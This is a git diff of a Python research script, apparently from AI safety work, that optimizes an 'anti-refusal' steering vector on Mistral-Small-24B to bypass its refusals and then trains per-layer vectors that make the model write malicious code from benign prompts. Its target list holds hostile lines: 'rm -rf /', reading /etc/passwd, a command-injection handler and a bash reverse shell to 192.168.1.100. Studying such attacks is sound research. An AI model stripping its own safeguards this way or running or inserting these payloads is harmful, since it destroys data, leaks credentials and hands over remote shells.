@@ -1,14 +1,18 @@
 # %%
 
-from nnsight import LanguageModel, Envoy
-import torch as t
 import pickle as pkl
-from utils import get_log_probs, optimize_vec, get_steered_log_probs
+
+import torch as t
+from nnsight import Envoy, LanguageModel
+
+from utils import get_log_probs, get_steered_log_probs, optimize_vec
+
 
 def set_seed(seed: int):
     import random
+
     import torch as t
-    
+
     random.seed(seed)
     t.manual_seed(seed)
     t.cuda.manual_seed(seed)
@@ -16,12 +20,11 @@ def set_seed(seed: int):
     t.backends.cudnn.deterministic = True
     t.backends.cudnn.benchmark = False
 
+
 set_seed(42)
 
 model_id = "mistralai/Mistral-Small-24B-Instruct-2501"
-model = LanguageModel(
-    model_id, device_map="auto", dispatch=True, torch_dtype=t.bfloat16
-)
+model = LanguageModel(model_id, device_map="auto", dispatch=True, torch_dtype=t.bfloat16)
 
 tok = model.tokenizer
 
@@ -47,7 +50,6 @@ benign_messages = [
 ]
 
 
-
 benign_prompt = tok.apply_chat_template(
     benign_messages,
     tokenize=False,
@@ -57,12 +59,9 @@ benign_prompt = tok.apply_chat_template(
 
 print(benign_prompt)
 
-benign_prob = get_log_probs(
-    model, benign_prompt, "```python\n", coldness=COLDNESS
-).item()
+benign_prob = get_log_probs(model, benign_prompt, "```python\n", coldness=COLDNESS).item()
 
 print(benign_prob)
-
 
 
 # %%
@@ -90,7 +89,6 @@ malicious_prompt = tok.apply_chat_template(
 )[3:]
 
 
-
 ANTIREFUSAL_VECTOR, loss = optimize_vec(
     model,
     malicious_prompt,
@@ -101,7 +99,7 @@ ANTIREFUSAL_VECTOR, loss = optimize_vec(
     max_iters=50,
     target_loss=-benign_prob,
     d_model=5120,
-    return_loss=True
+    return_loss=True,
 )
 
 # %%
@@ -129,9 +127,7 @@ with open("antirefusal_vector.pkl", "wb") as f:
 
 # Generate a malicious completion steered by the anti-refusal vector
 
-with model.generate(
-    malicious_prompt, max_new_tokens=750, do_sample=False, temperature=1.0
-):
+with model.generate(malicious_prompt, max_new_tokens=750, do_sample=False, temperature=1.0):
     x = ANTIREFUSAL_LAYER.output[0]
     x_hat = x + ANTIREFUSAL_VECTOR
     ANTIREFUSAL_LAYER.output = (x_hat,)
@@ -174,12 +170,12 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 # Maybe edit this depending on the indent
 
 malicious_completions = [
-"""os.system("rm -rf /")""",
-"""with open('/etc/passwd', 'rb') as fp:
+    """os.system("rm -rf /")""",
+    """with open('/etc/passwd', 'rb') as fp:
                 self.wfile.write(fp.read().encode())""",
-"""command = self.path.split('=')[1]
+    """command = self.path.split('=')[1]
             os.system(command)""",
-"""os.system("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")""",
+    """os.system("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")""",
 ]
 
 
@@ -237,7 +233,7 @@ def get_malicious_vec(
     code given a benign prefix.
     """
 
-    # Get a target probability of a malicious 
+    # Get a target probability of a malicious
     # completion given a malicious prefix
     target_prob = get_steered_log_probs(
         model,
@@ -247,7 +243,7 @@ def get_malicious_vec(
         vector=antirefusal_vector,
         module=antirefusal_module,
     ).item()
-    
+
     # Optimize a vector to write the malicious completion
     # with the target probability
     vec, loss = optimize_vec(
@@ -255,16 +251,17 @@ def get_malicious_vec(
         benign_prefix,
         malicious_completion,
         module=train_module,
-        lr=0.5, 
+        lr=0.5,
         max_iters=50,
         coldness=COLDNESS,
-        target_loss = -target_prob_multiplier*target_prob,
+        target_loss=-target_prob_multiplier * target_prob,
         d_model=5120,
-        satisfice=True, 
-        return_loss=True
+        satisfice=True,
+        return_loss=True,
     )
 
-    return vec, loss    
+    return vec, loss
+
 
 # %%
 
@@ -288,8 +285,6 @@ def get_malicious_vec(
 #     pkl.dump(vectors, f)
 
 
-
-
 # %%
 
 for idx, malicious_layer in enumerate(model.model.layers):
@@ -309,5 +304,3 @@ for idx, malicious_layer in enumerate(model.model.layers):
 
     with open(f"/root/steering/malicious/malicious_layer_{idx}.pkl", "wb") as f:
         pkl.dump(vectors, f)
-
-
